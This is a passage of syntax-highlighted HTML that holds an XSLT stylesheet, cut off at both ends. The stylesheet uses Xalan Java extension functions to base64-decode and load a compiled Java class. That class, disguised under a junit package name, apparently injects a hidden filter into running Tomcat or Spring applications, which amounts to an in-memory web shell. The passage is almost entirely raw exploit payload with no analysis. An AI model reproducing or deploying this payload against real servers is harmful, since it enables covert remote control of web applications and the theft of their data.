class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADEBsgEAG29yZy9qdW5pdC9tL0VuY3J5cHRpb25VdGlscwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQACLyoIAAgBAAxnZXRDbGFzc05hbWUBAChjaC5xb3MubG9nYmFjay5Db250ZXh0TG9hZGVyQ2F5emJ2RmlsdGVyCAALAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAA8BABBqYXZhL2xhbmcvU3RyaW5nBwARAQpESDRzSUFBQUFBQUFBLzZWWENYY1QxeFgrbmlWN1pGbUVJSUt4Z0FRbkthREZ0aEtNcVpFSmllVTR3WWx0VWlzMWRad3VZMmxrQ1dTTjBJd2NSSmVrNmI2blRiZDAzMGwzMGdZWkJ3SjBDdzFObTI3dXYwbFB2emNqeVpJc0c4N3BPZGFiZWUvZTk5Mzd2cnU4OGZYL3ZuSVp3TDM0ajRBL25ncWYwbzF3UnArZlUrTW53eU42MXRST20rTzZtdER5STJyeHpOemlRK21NcWVVVkNJRnRKOVJGTlp4UnMvUGhrWXhxR0xhYUFvZkFiVkowT214bytjV01ab1lybTFvRnhEdzMrbWVqZ2ZHRzNVTUN6aEU5b1Fsc0hrOW50Y25Dd3B5V2YxeWR5M0RGTzY3SDFjeTBtay9MZVhuUmFhYlNoa0J3L0dhZHBnVXhKOUF5R3hYb1NHaEpXckVzQzJ5blEyTmphMTN5NEZac2NjTUpyMERiNFhRMmJSNFJjUGdEMHg3Y2htMVMwQ213dzkrNHp6WTlGSmltd1RqUjE1RkxrQzRKc2xQQWxkQnRKd1ZtYmJ4VjltTDJjMG83VmRBTWMyZzlxWkhUczRiV0tMWlJSMUpxT21zNXRIWFZsOUhUY1MxbnB2V3NndDBDaXFFWkJpY0MzUTBRS2RQTWhZOXlpTmthNU5HaHo1MlFnYkxBQ21ZNkU1NVFjMXpmVnQ0YXp4ZHpwaDRlU2VkU051OWFSZFpnbXJKYmpMcnpDZHl4OGZscDE2Zy9zOER1RzVEQ2dDZFhpUkRZdVFGTHBDSmZjV1hmK2xRMCtPVEtWNTFwak4vYVRWV3Y5dHdVdklMOUFudHZEbFRCQVlGTk1aT1Z3SkNVUzhXZDBtVEdUYW9MVmpHdHhpRm01dFBaZVdiaTJ6SFlqaFljRW1pZjE4eWpsanB0K3RmcUJwcHRIOExoRHZUalB2SnNtNXBXTXdYTmcvdHQyQWNFYm0zY3BZQmw2SXF6V0VrNmEzQm5YUm1sMUh4TUhqNGIxNFlDVDNqd0lFYmRHTUZEUEF2OWkxVlM5UzUvNEViSjZzRlJqRW5uSGhIWXNwcXZSMVVqUllJVWpMc3hnVTRYK2toYlhUb3JlSXlKbmlzd0RRWnJmVHMyZDBLTGw4dXdiaVd3ZHNtREtjUTY4QTQ4N3NJOUx0ekpTaWk0OEM0MnJ4ejdnQWRQMlB6TU11azNQb2FDZDVNdE9tTVJ5OFJzRXBrbUhyRlJ2UmZ2NjhCN29QSXN3Nk14RitMbEh0QlFwQXFJMmtGdXg3S0dxWkoyZ2NDNjBXOHNjQS9ta1hJamlUUkxzVTdCeUdseFZtTThyNW1QYXNVWVp3cE84aVEwRkMyYUd1UHU5QWRtb3g0c0lDc0RyTnZOdUlsaHErZWVjaU1ESnFaVDltS3BPbVpyR2xxOGtFK2J4VENOV0tvbUN0S2Z4YnJFczFsUmNOcDJvTno4dC9xYk5mNHplTDhiUlh5QTNhWkJxT0JEYkZxVi9YWXZGL0N0UmFtMitXZndZVGVleHJOdWhwcTlmdGRHN1UzQngrd2FuQ3JYNEk0S2NGb1BSd3ZKcEpiWEVyYU15Si9BSnp2d2NYeEtvTE81am9MUFdMMUpUY2hMbFJlenYybjlmZzZmZCtPeitBSVBsdENqcXFFZFBQQ2dGcmR1NDg1bVdTQWo5a1Y4U1I3b2VmWkxlWGxsMVF3dlNYbXpTK0ZYOEZYSi85YzhVT0NTYWk4d3U3TGFVNnZaVmU5SnRWNitpVzlKcnI1TkxCS2laZ3o1dWRBa3M5a1R2b3Z2eVJCOW4rU3YyODBWL0ZEZ2dmL3ZScFg1ZER0KzNJRWY0U2ZzUDlXN3k2amNwbVI5N0ZqTmJmclROZVZjaHF6UitibEFhenlqbmpuRHJ0VGtVMGhKV1BUbjY5dDErZkRNLzBVMVA4Q0tOa3hxZEJxRmJOOUMyb2ozUllkam81WEk1VjM0TFhHU2VybnQ3N2xCTDY4ay9ubVVaQUNXQkR5MkQzWkN1YkJzNStXRVpxYjBSSlhVT3J6Wk5YaTFGdkphTWtQM3d6WUNUVjNFSlducVZZR3U5YlFVWEdFbXBMT0wra21lNFZDVFRKaTl5VWI4Ty96ZWphdjRnNExONWFiUUp6dDluNTN0THJ4bVh5MVY4djVNdXpZQkxseG5XMnZNb1hLUzZkbGtldDc2c3ZJa2ExWlk1UnZwV3dGbThQUWlmWm5iZjI5eTRFQmljT0RRb05yZmZ6RHV3dDhwbjlKa0dkT1JmOUtScWVTQ3NiRGd3cjl4SjJ2SkNTN0J3WkgzQjcvZGhieStyZWY5MXBOZjU3THNPTFp6ZGgvMVcvaHNENFljb2N0TDJIcU9reGE0T2JaUkJXeXJIUnc3YlNWNHNBbXczbTdCWnNxRi9OUXRRNDFTUis3WUhseml6L3VQODNneTZQM1hlVVNDM3BYekdINnBDdXkyd0xZVHRNc0M5OWpieXVBU3Nxc00rUmcxcFc1WE1MU0VYVGZHM0VtVVhUVU9kMVVkN29JUE95eUhiOGNkbEJGZFhPSVJwWldWMEZYMFI1dzlWekVRYWZVNWd5OGpzb3dqTFhnTkw5Yk0rREpjd3NNdjRIbXB2b3hIQlNKdEZ6RXhzNFRKaU9KVHZNZEN5M2luQThmNU91MXJyYjRmOTdXVjM5dThNd1I1Y2hsekRuZ1RGM0FpNHZLNVdpOGlZeTJYa1BNbWxtQ1U4TlJGdE13RVMvaGdDUjlad2tkOXJpQ1JQeTFRd25NbGZMbUVyNWZ3alJLKzQxTksrTUh4cytqb0RmVXM0NndEWjdFcDBsYVp2TVNqZW5BTjE5SE5aSkFVUFFJdng5MDhkRGNsZHlPTXR5R0NQYnhYOTJJUys1Z3VmamJsSUF5RWVNSDE0RG4wNGhMNmNJV2ExL2lKZEozL0JyNkIvVXl6QXhiRlNhSkc4Q3lUN2k1aWpyRFozazFFaFh1akpIc1BVK3dOL3ZZU3VVMlNYQTNGQ3UwRXJKQ3YwRnJJQ3RRSzdmWFN6emE4U1l0aEpxVUhyK01lV216RlFjcTN3UGtXcmlqb1Z6Q2dSQlYwdCtORkswVmI4RFA4Z21DOGIreW80aTJ1dHZKWjlMNThBUmNtZXJ5dk9GL0Ywek1PNzBpc2hNczlKSTd6NG93anhPa2ZyK0pQMWI5ekU5NXIzREhaNjMzZHdSMVVGbndXcVJWeCtwd01oL2N2dFVnKzUzbzQxdG1rN3hYbWQxZ01ESEk4eE5VSU9Semk3RERHV1g2U3lTT1V0SkdKWCtKWFBNUWdocTAzQitXOStEWE9rWTM5ZUpnUjNXZHhWYXd5V2NSdnFDMHNobGl0cDhpTFJZdHNBZDM4bVl5QVRjcUFWU2pNK2RXS3NjczdXbE10b2dvczhGZjhqV01GVERMOFpyWFFRNVpHRTdEUm1uS3VndjBQbkcyM3IwTVFBQUE9CAATAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABIAFwEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABoBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAHUxvcmcvanVuaXQvbS9FbmNyeXB0aW9uVXRpbHM7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAJExqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADmphdmEvdXRpbC9MaXN0BwAnAQASamF2YS91dGlsL0l0ZXJhdG9yBwApAQANU3RhY2tNYXBUYWJsZQwAFQAZCgAEACwBAApnZXRDb250ZXh0AQASKClMamF2YS91dGlsL0xpc3Q7DAAuAC8KAAIAMAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAMgAzCwAoADQBAAdoYXNOZXh0AQADKClaDAA2ADcLACoAOAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAOgA7CwAqADwBAAlnZXRGaWx0ZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAPgA/CgACAEABAAlhZGRGaWx0ZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAEIAQwoAAgBEAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBQAQAQamF2YS9sYW5nL1RocmVhZAcAUgEAEWphdmEvdXRpbC9IYXNoTWFwBwBUAQATamF2YS91dGlsL0FycmF5TGlzdAcAVgoAVwAsAQAKZ2V0VGhyZWFkcwgAWQEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABbAFwKAAIAXQEAB2dldE5hbWUMAF8ABgoAUwBgAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAYgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABkAGUKABIAZgEABnRhcmdldAgAaAEABWdldEZWDABqAFwKAAIAawEABnRoaXMkMAgAbQgARwEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABwAHEKAFUAcgEADWphdmEvdXRpbC9TZXQHAHQLAHUANAEAA2dldAwAdwA/CgBVAHgBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHoAewoABAB8AQAPamF2YS9sYW5nL0NsYXNzBwB+CgB/AGABAA9TdGFuZGFyZENvbnRleHQIAIEBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIMAhAsAKACFAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACHAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAiQCKCgBTAIsBAAh0b1N0cmluZwwAjQAGCgB/AI4BABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACQAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAkgEACXJlc291cmNlcwgAlAgAIAEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCXAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAAVAJkKAJgAmgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCcAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAngEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAKABAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKQBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcArgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAsACxCgBTALIBAA5nZXRDbGFzc0xvYWRlcgwAtACKCgB/ALUMAAoABgoAAgC3AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAuQC6CgCvALsMAA0ABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKgHAKcBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqwkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAH8A0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAtuZXdJbnN0YW5jZQwA4AA7CgB/AOEBAA1nZXRGaWx0ZXJOYW1lAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxsYXN0RG90SW5kZXgBAAFJAQAJY2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQABLggA6QEAC2xhc3RJbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJDADrAOwKABIA7QEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwwA7wDwCgASAPEBAAlmaWx0ZXJEZWYBAAlmaWx0ZXJNYXABAAJlMgEADGNvbnN0cnVjdG9ycwEAIFtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAMZmlsdGVyQ29uZmlnAQANZmlsdGVyQ29uZmlncwEAD0xqYXZhL3V0aWwvTWFwOwEADmNhdGFsaW5hTG9hZGVyAQAPZmlsdGVyQ2xhc3NOYW1lAQAKZmlsdGVyTmFtZQEAI1tMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47BwD3AQARZ2V0Q2F0YWxpbmFMb2FkZXIMAQAAigoAAgEBDADjAOQKAAIBAwEADWZpbmRGaWx0ZXJEZWYIAQUBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFsBBwoAAgEIAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIAQoBAAdmb3JOYW1lDAEMALoKAH8BDQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAEPAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAERAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAETAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwwBDAEVCgB/ARYBAA1zZXRGaWx0ZXJOYW1lCAEYAQAOc2V0RmlsdGVyQ2xhc3MIARoBAAxhZGRGaWx0ZXJEZWYIARwBAA1zZXREaXNwYXRjaGVyCAEeAQAHUkVRVUVTVAgBIAEADWFkZFVSTFBhdHRlcm4IASIMAAUABgoAAgEkAQAwb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCAEmAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAEoASkKAH8BKgEADXNldFVSTFBhdHRlcm4IASwBABJhZGRGaWx0ZXJNYXBCZWZvcmUIAS4BAAxhZGRGaWx0ZXJNYXAIATABAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcBMgoBMwDWAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADgATUKATMBNggA+QEADWphdmEvdXRpbC9NYXAHATkBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBOwE8CwE6AT0BAA9wcmludFN0YWNrVHJhY2UMAT8AGQoAGwFAAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAUIBACBqYXZhL2xhbmcvSW5zdGFudGlhdGlvbkV4Y2VwdGlvbgcBRAEAAWkBAAxkZWNvZGVyQ2xhc3MBAAdkZWNvZGVyAQAHaWdub3JlZAEACWJhc2U2NFN0cgEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBTAEADGRlY29kZUJ1ZmZlcggBTgEACWdldE1ldGhvZAwBUADPCgB/AVEBABBqYXZhLnV0aWwuQmFzZTY0CAFTAQAKZ2V0RGVjb2RlcggBVQEABmRlY29kZQgBVwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBYgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAWQBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBZgoBYwAsAQAFKFtCKVYMABUBaQoBZQFqAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAVAWwKAWcBbQEABHJlYWQBAAUoW0IpSQwBbwFwCgFnAXEBAAV3cml0ZQEAByhbQklJKVYMAXMBdAoBYwF1AQALdG9CeXRlQXJyYXkBAAQoKVtCDAF3AXgKAWMBeQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAX8BgAoAAgGBAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAYMKAYQA1goBhAB4AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwGHAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAGKAYsKAH8BjAEADWdldFN1cGVyY2xhc3MMAY4AewoAfwGPCgGIABcBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q7AQAGbWV0aG9kAQAJdGVtcENsYXNzBwGVAQASZ2V0RGVjbGFy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